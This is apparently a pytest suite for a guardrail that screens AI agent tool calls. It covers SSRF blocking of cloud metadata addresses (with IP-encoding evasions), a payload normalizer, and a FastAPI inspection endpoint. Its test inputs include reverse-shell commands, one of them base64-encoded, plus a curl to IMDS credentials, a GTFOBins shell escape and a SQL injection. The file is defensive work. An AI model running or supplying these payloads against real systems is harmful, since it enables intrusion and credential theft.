import pytest
import httpx
from httpx import AsyncClient, ASGITransport

from core.detection.guardrails.ssrf_filter import SSRFFilter
from core.detection.guardrails.ast_normalizer import PayloadNormalizer
from core.detection.tool_guardrail import tool_guardrail
from core.gateway.app import app


# --------------------------------------------------------------------------
# 1. SSRF Filter Tests & Evasion Hardening
# --------------------------------------------------------------------------
def test_ssrf_cloud_metadata_direct():
    blocked, reason, ip = SSRFFilter.inspect_target("http://169.254.169.254/latest/meta-data/")
    assert blocked is True
    assert "Cloud IMDS" in reason


def test_ssrf_decimal_ip_evasion():
    # 2852039166 == 169.254.169.254
    blocked, reason, ip = SSRFFilter.inspect_target("http://2852039166/latest/meta-data/")
    assert blocked is True


def test_ssrf_hex_ip_evasion():
    # 0xA9FEA9FE == 169.254.169.254
    blocked, reason, ip = SSRFFilter.inspect_target("http://0xA9FEA9FE/latest/meta-data/")
    assert blocked is True


def test_ssrf_mixed_octal_decimal():
    # 0251.254.169.254 == 169.254.169.254
    blocked, reason, ip = SSRFFilter.inspect_target("http://0251.254.169.254/latest/meta-data/")
    assert blocked is True


def test_ssrf_dotted_hex():
    # 0xa9.0xfe.0xa9.0xfe == 169.254.169.254
    blocked, reason, ip = SSRFFilter.inspect_target("http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/")
    assert blocked is True


def test_ssrf_alibaba_metadata():
    # 100.100.100.200 (Alibaba Cloud metadata IP)
    blocked, reason, ip = SSRFFilter.inspect_target("http://100.100.100.200/latest/meta-data/")
    assert blocked is True


def test_ssrf_azure_wireserver():
    # 168.63.129.16 (Azure WireServer)
    blocked, reason, ip = SSRFFilter.inspect_target("http://168.63.129.16/machine/plugins/")
    assert blocked is True


def test_ssrf_localhost_and_metadata_hostnames():
    blocked, reason, ip = SSRFFilter.inspect_target("http://localhost:8080/secret")
    assert blocked is True

    blocked, reason, ip = SSRFFilter.inspect_target("http://instance-data/latest/meta-data")
    assert blocked is True


def test_ssrf_loopback():
    blocked, reason, ip = SSRFFilter.inspect_target("http://127.0.0.1:8080/admin")
    assert blocked is True
    assert "Loopback" in reason or "Non-global" in reason


def test_ssrf_safe_external_url():
    blocked, reason, ip = SSRFFilter.inspect_target("https://api.github.com/repos")
    assert blocked is False


# --------------------------------------------------------------------------
# 2. AST Normalizer & Reverse Shell Tests
# --------------------------------------------------------------------------
def test_ast_base64_reverse_shell():
    payload = "echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjAuMC4xLzQyNDIgMD4mMQ== | base64 -d | sh"
    norm, threat = PayloadNormalizer.inspect(payload)
    assert threat is not None
    assert "reverse shell" in threat.lower()


def test_ast_multiline_reverse_shell():
    # Test multiline matching across newlines (\n)
    payload = "bash -i\n>& /dev/tcp/10.0.0.1/4242\n0>&1"
    norm, threat = PayloadNormalizer.inspect(payload)
    assert threat is not None


def test_ast_shell_curl_to_imds():
    payload = "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    norm, threat = PayloadNormalizer.inspect(payload)
    assert threat is not None


def test_ast_gtfobins_abuse():
    payload = "find . -exec /bin/sh -p \\; -quit"
    norm, threat = PayloadNormalizer.inspect(payload)
    assert threat is not None
    assert "gtfobins" in threat.lower()


def test_ast_sql_sleep():
    payload = "SELECT * FROM users WHERE id=1; SELECT pg_sleep(10);"
    norm, threat = PayloadNormalizer.inspect(payload)
    assert threat is not None
    assert "sql injection" in threat.lower()


def test_ast_oversize_padding_fail_closed():
    # 70KB of padding to test Claude C1 vulnerability
    padding_payload = "A" * 70_000
    norm, threat = PayloadNormalizer.inspect(padding_payload)
    assert threat is not None
    assert "exceeds 64kb" in threat.lower()


# --------------------------------------------------------------------------
# 3. Guardrail Engine Direct Inspection Tests
# --------------------------------------------------------------------------
def test_guardrail_nested_argument_ssrf():
    # SSRF nested deep in structured JSON arguments
    nested_args = {"client": {"options": {"endpoint": "http://169.254.169.254/latest/meta-data/"}}}
    res = tool_guardrail.inspect_tool_call("custom_downloader", nested_args)
    assert res["decision"] == "BLOCK"
    assert res["flagged_by"] == "SSRF_FILTER"


def test_guardrail_invalid_tool_name():
    res = tool_guardrail.inspect_tool_call(None, {"cmd": "ls"})
    assert res["decision"] == "BLOCK"
    assert res["flagged_by"] == "VALIDATION_ERROR"


def test_guardrail_clean_command():
    res = tool_guardrail.inspect_tool_call("run_terminal_command", "git log -n 5")
    assert res["decision"] == "ALLOW"
    assert res["risk_score"] == 0.0


# --------------------------------------------------------------------------
# 4. Gateway FastAPI /api/v1/inspect-tool Integration Tests
# --------------------------------------------------------------------------
@pytest.mark.asyncio
async def test_gateway_inspect_tool_ssrf():
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as ac:
        response = await ac.post("/api/v1/inspect-tool", json={
            "tool_name": "http_get",
            "arguments": {"url": "http://169.254.169.254/computeMetadata/v1/"}
        })
    assert response.status_code == 403
    data = response.json()
    assert data["decision"] == "BLOCK"
    assert data["flagged_by"] == "SSRF_FILTER"


@pytest.mark.asyncio
async def test_gateway_inspect_tool_clean():
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as ac:
        response = await ac.post("/api/v1/inspect-tool", json={
            "tool_name": "run_terminal_command",
            "arguments": {"cmd": "docker ps"}
        })
    assert response.status_code == 200
    data = response.json()
    assert data["decision"] == "ALLOW"
    assert data["flagged_by"] == "CLEAN"
